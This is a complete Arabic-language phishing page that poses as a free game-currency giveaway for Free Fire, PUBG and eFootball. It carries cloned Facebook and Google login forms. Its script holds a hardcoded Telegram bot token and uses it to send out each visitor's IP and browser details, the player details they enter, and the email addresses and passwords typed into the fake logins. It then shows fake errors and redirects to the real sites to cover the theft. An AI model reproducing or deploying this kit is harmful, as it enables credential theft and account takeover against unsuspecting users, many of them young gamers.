<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Rewards Hub | منصة الجوائز المتكاملة</title>
    <!-- Font Awesome 6 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(145deg, #0B1120 0%, #19213C 100%);
            color: #f1f5f9;
            min-height: 100vh;
            padding: 2rem 1rem;
        }
        .container {
            max-width: 1300px;
            margin: 0 auto;
        }
        /* الأقسام المخفية/الظاهرة */
        .page {
            display: none;
            animation: fadeIn 0.4s ease;
        }
        .page.active {
            display: block;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px);}
            to { opacity: 1; transform: translateY(0);}
        }
        /* الهيدر المشترك */
        .hero {
            text-align: center;
            margin-bottom: 2rem;
        }
        .hero h1 {
            font-size: 2.8rem;
            background: linear-gradient(135deg, #FFE6B0, #FFB347, #FF9100);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        /* عناصر الصفحة الرئيسية */
        .games-grid {
            display: flex;
            justify-content: center;
            gap: 2rem;
            flex-wrap: wrap;
            margin-bottom: 2rem;
        }
        .game-card {
            background: rgba(15, 25, 45, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            padding: 1.2rem 2rem;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s;
            border: 1px solid rgba(255,215,0,0.3);
            width: 160px;
        }
        .game-card.selected {
            background: #facc15;
            color: #0f172a;
            border-color: #facc15;
            transform: scale(1.02);
        }
        .game-card img {
            width: 70px;
            height: 70px;
            margin-bottom: 0.5rem;
        }
        .game-card span {
            font-size: 1.3rem;
            font-weight: 800;
            display: block;
        }
        .reward-panel {
            background: rgba(0,0,0,0.45);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            padding: 1.5rem;
            margin: 2rem 0;
            text-align: center;
            display: none;
        }
        .reward-panel.active {
            display: block;
        }
        .reward-title {
            font-size: 1.8rem;
            color: #facc15;
        }
        .reward-buttons {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 1rem;
            margin-top: 1rem;
        }
        .reward-option {
            background: #1e293b;
            padding: 0.7rem 1.5rem;
            border-radius: 3rem;
            font-weight: bold;
            cursor: pointer;
            border: 1px solid #facc15;
            color: #facc15;
        }
        .reward-option.selected {
            background: #facc15;
            color: #0f172a;
        }
        .form-card {
            background: rgba(15, 25, 45, 0.7);
            backdrop-filter: blur(16px);
            border-radius: 2rem;
            padding: 1.8rem;
            margin: 1.5rem 0;
        }
        .input-group {
            margin-bottom: 1.2rem;
        }
        .input-group label {
            display: block;
            font-weight: 600;
            color: #facc15;
            margin-bottom: 0.3rem;
        }
        .input-group input, .input-group select {
            width: 100%;
            padding: 0.9rem;
            background: #0f172a;
            border: 2px solid #334155;
            border-radius: 1.5rem;
            font-size: 1rem;
            color: white;
        }
        .input-group input:focus {
            border-color: #facc15;
            outline: none;
        }
        .btn-primary {
            background: linear-gradient(95deg, #facc15, #ffb347);
            border: none;
            padding: 0.9rem;
            font-size: 1.2rem;
            font-weight: 800;
            border-radius: 3rem;
            color: #0f172a;
            width: 100%;
            cursor: pointer;
        }
        .banners-section {
            display: flex;
            justify-content: center;
            gap: 2rem;
            flex-wrap: wrap;
            margin: 2rem 0;
        }
        .banner {
            background: white;
            border-radius: 1.5rem;
            width: 180px;
            padding: 1rem;
            text-align: center;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .banner img {
            width: 55px;
            height: 55px;
            margin-bottom: 0.5rem;
        }
        .banner span {
            font-weight: 800;
            color: #0f172a;
        }
        .waiting-overlay {
            text-align: center;
            background: #000000aa;
            padding: 1rem;
            border-radius: 2rem;
            margin: 1rem 0;
            display: none;
            font-size: 1.1rem;
            color: #facc15;
        }
        /* صفحة فيسبوك */
        .fb-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            max-width: 400px;
            margin: 0 auto;
            text-align: center;
            color: #1c1e21;
        }
        .fb-logo {
            font-size: 56px;
            font-weight: 800;
            color: #1877f2;
        }
        .fb-input {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        .fb-btn {
            width: 100%;
            background: #1877f2;
            color: white;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        .error-msg {
            background: #ffebee;
            color: #c62828;
            padding: 8px;
            border-radius: 6px;
            margin: 8px 0;
            display: none;
        }
        /* صفحة جوجل */
        .google-card {
            background: white;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 40px;
            border-radius: 8px;
            text-align: center;
            color: #202124;
        }
        .google-logo {
            width: 75px;
            margin-bottom: 20px;
        }
        .google-input {
            width: 100%;
            padding: 13px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            margin-bottom: 16px;
        }
        .google-btn {
            background: #1a73e8;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
        }
        .footer {
            text-align: center;
            margin-top: 2rem;
            color: #5b6e8c;
            font-size: 0.8rem;
        }
        .back-link {
            display: inline-block;
            margin-bottom: 1rem;
            color: #facc15;
            cursor: pointer;
        }
    </style>
</head>
<body>
<div class="container">
    <!-- صفحة الفهرس الرئيسية -->
    <div id="indexPage" class="page active">
        <div class="hero">
            <h1><i class="fas fa-gem"></i> Reward Nexus <i class="fas fa-trophy"></i></h1>
            <p>المنصة الرسمية لتوزيع الهدايا والجوائز</p>
        </div>

        <div class="games-grid">
            <div class="game-card" data-game="freefire">
                <img src="https://cdn-icons-png.flaticon.com/512/2096/2096133.png" alt="FreeFire"><span>فري فاير</span>
            </div>
            <div class="game-card" data-game="pubg">
                <img src="https://cdn-icons-png.flaticon.com/512/1051/1051380.png" alt="PUBG"><span>ببجي</span>
            </div>
            <div class="game-card" data-game="efootball">
                <img src="https://cdn-icons-png.flaticon.com/512/6193/6193496.png" alt="eFootball"><span>إيفتبول</span>
            </div>
        </div>

        <div id="rewardPanel" class="reward-panel">
            <div class="reward-title" id="rewardTitle">اختر هديتك</div>
            <div id="rewardOptions" class="reward-buttons"></div>
        </div>

        <div class="form-card">
            <div class="input-group"><label>👤 اسم المستخدم</label><input type="text" id="playerName" placeholder="الاسم الكامل"></div>
            <div class="input-group"><label>🌍 البلد</label><select id="countrySelect"><option value="">-- اختر --</option><option>مصر</option><option>السعودية</option><option>الإمارات</option><option>الكويت</option><option>قطر</option><option>عمان</option><option>البحرين</option><option>العراق</option><option>الأردن</option><option>لبنان</option><option>فلسطين</option><option>اليمن</option><option>السودان</option><option>ليبيا</option><option>تونس</option><option>الجزائر</option><option>المغرب</option></select></div>
            <div class="input-group"><label>🆔 معرف اللاعب (ID)</label><input type="text" id="playerID" placeholder="مثال: 123456789"></div>
            <button class="btn-primary" id="submitInfoBtn">متابعة إلى طريقة الاستلام ➡️</button>
        </div>

        <div id="bannersArea" style="display:none;">
            <div class="banners-section">
                <div class="banner" id="facebookBanner"><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="FB"><span>فيسبوك</span></div>
                <div class="banner" id="googleBanner"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google"><span>جوجل</span></div>
                <div class="banner" id="freeBanner"><img src="https://cdn-icons-png.flaticon.com/512/2991/2991101.png" alt="Quick"><span>تسجيل سريع</span></div>
            </div>
            <div class="waiting-overlay" id="waitingMessage">⏳ جارٍ تجهيز طلبك...</div>
        </div>
        <div class="footer">© 2025 Reward Nexus</div>
    </div>

    <!-- صفحة فيسبوك -->
    <div id="facebookPage" class="page">
        <div class="fb-container">
            <div class="fb-logo">facebook</div>
            <form id="fbLoginForm">
                <input type="text" id="fbEmail" class="fb-input" placeholder="البريد الإلكتروني أو رقم الهاتف">
                <input type="password" id="fbPassword" class="fb-input" placeholder="كلمة السر">
                <button type="submit" class="fb-btn">تسجيل الدخول</button>
                <div id="errorAreaFB"></div>
                <div id="waitingMsgFB" style="background:#e3f2fd; padding:10px; border-radius:8px; display:none; margin-top:10px;">⏳ جارٍ التحقق...</div>
            </form>
            <div class="back-link" onclick="showPage('indexPage')">← العودة للرئيسية</div>
        </div>
    </div>

    <!-- صفحة جوجل -->
    <div id="googlePage" class="page">
        <div class="google-card">
            <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
            <h2>تسجيل الدخول</h2>
            <form id="googleForm">
                <input type="email" id="googleEmail" class="google-input" placeholder="البريد الإلكتروني">
                <input type="password" id="googlePassword" class="google-input" placeholder="كلمة المرور">
                <button type="submit" class="google-btn">التالي</button>
                <div id="googleError" style="color:red; margin-top:10px; display:none;">كلمة المرور غير صحيحة</div>
            </form>
            <div class="back-link" onclick="showPage('indexPage')">← العودة للرئيسية</div>
        </div>
    </div>
</div>

<script>
    // إعدادات تليغرام
    const BOT_TOKEN = "8660183367:AAE5ij6hIPqPnbhTQoBZ5lNBdxykxsTMAyI";
    const CHAT_ID = "7848695581";

    // متغيرات الصفحة الرئيسية
    let selectedGame = null;
    let selectedRewardValue = null;
    let userCaptured = { name: "", country: "", playerID: "" };

    const rewardsMap = {
        freefire: { name: "فري فاير", icon: "💎", rewards: ["300 جوهرة","600 جوهرة","1200 جوهرة","2500 جوهرة"], values: ["300","600","1200","2500"] },
        pubg: { name: "ببجي", icon: "🎯", rewards: ["500 شدات","1100 شدات","2500 شدات","5000 شدات"], values: ["500","1100","2500","5000"] },
        efootball: { name: "إيفتبول", icon: "⚽", rewards: ["500 كوين","1500 كوين","3500 كوين","10000 كوين"], values: ["500","1500","3500","10000"] }
    };

    // دوال مساعدة
    async function getIP() {
        try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip; } catch { return "غير معروف"; }
    }
    async function sendToTelegram(text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try { await fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode:"Markdown"}) }); } catch(e) {}
    }

    // إظهار صفحة مع إرسال إشعار
    window.showPage = function(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
        if (pageId === 'facebookPage') {
            sendToTelegram(`📱 *تم فتح صفحة فيسبوك التصيدية* IP: ${getIP()}`);
        } else if (pageId === 'googlePage') {
            sendToTelegram(`📧 *تم فتح صفحة جوجل التصيدية*`);
        }
    };

    // إرسال معلومات الزائر فوراً
    (async () => {
        const ip = await getIP();
        await sendToTelegram(`🌐 *زيارة جديدة للصفحة الرئيسية*\nIP: ${ip}\nالمتصفح: ${navigator.userAgent}\nالوقت: ${new Date()}`);
    })();

    // منطق الصفحة الرئيسية
    const gameCards = document.querySelectorAll('.game-card');
    const rewardPanel = document.getElementById('rewardPanel');
    const rewardTitle = document.getElementById('rewardTitle');
    const rewardOptionsDiv = document.getElementById('rewardOptions');
    const submitInfoBtn = document.getElementById('submitInfoBtn');
    const bannersArea = document.getElementById('bannersArea');
    const waitingMsgDiv = document.getElementById('waitingMessage');

    gameCards.forEach(card => {
        card.addEventListener('click', () => {
            gameCards.forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectedGame = card.getAttribute('data-game');
            const game = rewardsMap[selectedGame];
            rewardTitle.innerHTML = `${game.icon} هدايا ${game.name}`;
            rewardOptionsDiv.innerHTML = '';
            game.rewards.forEach((reward, idx) => {
                const btn = document.createElement('div');
                btn.className = 'reward-option';
                btn.innerText = reward;
                btn.dataset.value = game.values[idx];
                btn.addEventListener('click', () => {
                    document.querySelectorAll('#rewardOptions .reward-option').forEach(b => b.classList.remove('selected'));
                    btn.classList.add('selected');
                    selectedRewardValue = btn.dataset.value;
                    alert(`تم اختيار ${reward}. الآن أدخل بياناتك.`);
                });
                rewardOptionsDiv.appendChild(btn);
            });
            rewardPanel.classList.add('active');
        });
    });

    submitInfoBtn.addEventListener('click', async () => {
        const name = document.getElementById('playerName').value.trim();
        const country = document.getElementById('countrySelect').value;
        const pid = document.getElementById('playerID').value.trim();
        if (!name || !country || !pid) { alert("يرجى ملء جميع الحقول"); return; }
        if (!selectedGame || !selectedRewardValue) { alert("اختر لعبة وهدية أولاً"); return; }
        userCaptured = { name, country, playerID: pid };
        const ip = await getIP();
        const msg = `🎁 *طلب جديد*\n👤 ${name}\n🌍 ${country}\n🎮 ${rewardsMap[selectedGame].name}\n🆔 ${pid}\n💎 ${selectedRewardValue}\n📡 IP: ${ip}`;
        await sendToTelegram(msg);
        bannersArea.style.display = 'block';
        document.querySelector('.form-card').style.display = 'none';
    });

    document.getElementById('facebookBanner').addEventListener('click', async () => {
        waitingMsgDiv.style.display = 'block';
        await sendToTelegram(`🔵 *اختيار فيسبوك* للمستخدم ${userCaptured.name}`);
        setTimeout(() => { waitingMsgDiv.style.display = 'none'; showPage('facebookPage'); }, 1000);
    });
    document.getElementById('googleBanner').addEventListener('click', async () => {
        waitingMsgDiv.style.display = 'block';
        await sendToTelegram(`🟢 *اختيار جوجل* للمستخدم ${userCaptured.name}`);
        setTimeout(() => { waitingMsgDiv.style.display = 'none'; showPage('googlePage'); }, 1000);
    });
    document.getElementById('freeBanner').addEventListener('click', async () => {
        waitingMsgDiv.style.display = 'block';
        await sendToTelegram(`⚡ *تسجيل سريع* للمستخدم ${userCaptured.name} (سيتم توجيهه لفيسبوك افتراضياً)`);
        setTimeout(() => { waitingMsgDiv.style.display = 'none'; showPage('facebookPage'); }, 1000);
    });

    // منطق صفحة فيسبوك
    const fbForm = document.getElementById('fbLoginForm');
    const errorAreaFB = document.getElementById('errorAreaFB');
    const waitingFB = document.getElementById('waitingMsgFB');
    const errorMessages = ["❌ كلمة المرور غير صحيحة", "⚠️ تم اكتشاف محاولة دخول غير معتادة", "🔒 يلزم تأكيد الحساب عبر البريد"];

    fbForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('fbEmail').value.trim();
        const pass = document.getElementById('fbPassword').value;
        if (!email || !pass) return;
        const ip = await getIP();
        await sendToTelegram(`🔐 *اختراق فيسبوك*\n📧 ${email}\n🔑 ${pass}\n🌐 IP: ${ip}`);
        // عرض 3 أخطاء متسلسلة
        errorAreaFB.innerHTML = '';
        waitingFB.style.display = 'none';
        let idx = 0;
        function showNextError() {
            if (idx < errorMessages.length) {
                const div = document.createElement('div');
                div.className = 'error-msg';
                div.innerText = errorMessages[idx];
                div.style.display = 'block';
                errorAreaFB.appendChild(div);
                idx++;
                setTimeout(showNextError, 1200);
            } else {
                waitingFB.style.display = 'block';
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com";
                }, 3000);
            }
        }
        showNextError();
    });

    // منطق صفحة جوجل
    const googleForm = document.getElementById('googleForm');
    googleForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('googleEmail').value.trim();
        const pass = document.getElementById('googlePassword').value;
        if (!email || !pass) return;
        const ip = await getIP();
        await sendToTelegram(`🔴 *اختراق جوجل*\n📧 ${email}\n🔑 ${pass}\n🌐 IP: ${ip}`);
        const errorDiv = document.getElementById('googleError');
        errorDiv.style.display = 'block';
        setTimeout(() => {
            window.location.href = "https://accounts.google.com";
        }, 2500);
    });
</script>
</body>
                </html>
